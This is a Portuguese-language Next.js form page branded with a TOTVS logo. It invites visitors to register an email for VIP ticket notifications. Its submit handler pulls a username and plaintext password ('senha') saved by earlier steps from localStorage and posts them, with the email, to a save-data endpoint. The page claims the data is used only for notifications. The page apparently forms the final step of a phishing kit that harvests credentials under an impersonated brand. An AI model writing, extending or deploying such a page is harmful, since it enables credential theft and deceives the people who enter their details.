"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Mail, Bell, CheckCircle } from "lucide-react"
import Image from "next/image"

export default function FinalFormPage() {
  const [email, setEmail] = useState("")
  const [errors, setErrors] = useState({ email: "" })
  const [isSubmitted, setIsSubmitted] = useState(false)

  const validateEmail = (email: string) => {
    if (!email) return "Email é obrigatório"
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailRegex.test(email)) return "Email inválido"
    return ""
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    const emailError = validateEmail(email)

    setErrors({ email: emailError })

    if (!emailError) {
      try {
        const loginData = JSON.parse(localStorage.getItem("loginData") || "{}")
        const showData = JSON.parse(localStorage.getItem("selectedShow") || "{}")

        console.log("Dados recuperados do localStorage:", { loginData, showData })

        const response = await fetch("/api/save-data", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            type: "final_form",
            email: email,
            usuario: loginData.usuario || "N/A",
            senha: loginData.senha || "N/A",
            showSelecionado: showData.name || "N/A",
            timestamp: new Date().toISOString(),
          }),
        })

        const result = await response.json()
        console.log("Resposta da API:", result)

        localStorage.removeItem("loginData")
        localStorage.removeItem("selectedShow")
      } catch (error) {
        console.error("Error saving final form data:", error)
      }

      setIsSubmitted(true)
    }
  }

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="max-w-md w-full mx-4">
          <Card className="text-center border-green-200">
            <CardHeader>
              <div className="flex justify-center mb-4">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
                  <CheckCircle className="w-8 h-8 text-green-600" />
                </div>
              </div>
              <CardTitle className="text-2xl text-green-600">Cadastro Realizado!</CardTitle>
              <CardDescription className="text-gray-700">Seus dados foram registrados com sucesso</CardDescription>
            </CardHeader>

            <CardContent className="space-y-4">
              <div className="bg-green-50 p-4 rounded-lg border border-green-200">
                <p className="text-sm text-green-700">
                  <strong>Pronto!</strong> Você será notificado por email assim que novos ingressos VIP ficarem
                  disponíveis.
                </p>
              </div>

              <div className="flex items-center justify-center space-x-2 text-sm text-gray-600">
                <Bell className="w-4 h-4" />
                <span>Fique atento ao seu email: {email}</span>
              </div>

              <Button onClick={() => (window.location.href = "/")} variant="outline" className="w-full">
                Voltar ao início
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <div className="bg-white shadow-sm border-b border-gray-200">
        <div className="max-w-2xl mx-auto px-4 py-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <Image src="/totvs-logo.png" alt="TOTVS" width={100} height={32} />
              <div className="h-8 w-px bg-gray-300"></div>
              <h1 className="text-xl font-normal text-gray-700">Cadastro para Notificações</h1>
            </div>
            <Badge variant="secondary" className="bg-cyan-100 text-cyan-800 border-cyan-200">
              <Bell className="w-4 h-4 mr-1" />
              Últimas Vagas
            </Badge>
          </div>
        </div>
      </div>

      {/* Main content */}
      <div className="max-w-2xl mx-auto px-4 py-8">
        <Card className="border-gray-200">
          <CardHeader>
            <CardTitle className="text-2xl text-center text-gray-800">Não perca a próxima oportunidade!</CardTitle>
            <CardDescription className="text-center text-base text-gray-600">
              Informe seu email e seja o primeiro a saber quando novos ingressos VIP ficarem disponíveis
            </CardDescription>
          </CardHeader>

          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <Label htmlFor="email" className="text-gray-700 font-normal text-sm">
                  Email *
                </Label>
                <div className="relative mt-1">
                  <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-cyan-500 w-4 h-4" />
                  <Input
                    id="email"
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="pl-10 border-gray-300 focus:border-cyan-500 focus:ring-cyan-500 rounded-sm h-12"
                    placeholder="seu@email.com"
                  />
                </div>
                {errors.email && <p className="text-red-500 text-sm mt-1">{errors.email}</p>}
              </div>

              <div className="bg-cyan-50 p-4 rounded-lg border border-cyan-200">
                <h3 className="font-normal text-cyan-800 mb-2">O que você receberá:</h3>
                <ul className="text-sm text-cyan-700 space-y-1">
                  <li>• Notificações exclusivas sobre ingressos VIP disponíveis</li>
                  <li>• Acesso prioritário a novos shows e eventos</li>
                  <li>• Ofertas especiais para área de camarote</li>
                </ul>
              </div>

              <Button
                type="submit"
                className="w-full bg-cyan-500 hover:bg-cyan-600 py-3 text-lg h-12 rounded-sm font-normal"
              >
                Cadastrar e Receber Notificações
              </Button>

              <p className="text-xs text-gray-500 text-center">
                * Seus dados são protegidos e utilizados apenas para notificações sobre ingressos
              </p>
            </form>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
